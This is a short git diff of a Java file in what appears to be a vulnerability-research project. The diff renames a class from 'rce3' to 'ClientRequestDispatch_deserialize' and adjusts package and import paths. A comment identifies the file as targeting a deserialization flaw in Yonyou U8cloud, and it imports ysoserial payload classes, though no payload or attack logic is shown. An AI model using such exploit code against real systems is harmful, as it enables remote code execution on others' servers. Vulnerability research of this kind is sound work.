@@ -1,6 +1,6 @@
-package cve;
+package cve.u8cloud;
 
-import com.pacemrc.vuldebug.common.utils.HttpRequest;
+import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
 import org.apache.http.client.methods.HttpPost;
 import ysoserial.payloads.ObjectPayload;
 
@@ -12,7 +12,7 @@ import java.io.ObjectOutputStream;
  * U8cloud所有版本ClientRequestDispatch反序列化漏洞
  * https://security.yonyou.com/#/patchInfo?foreignKey=33a417377013454099efa313fc9fcf89
  */
-public class rce3 {
+public class ClientRequestDispatch_deserialize {
 
     private static byte[] serializeObject(Object obj) {
         try {
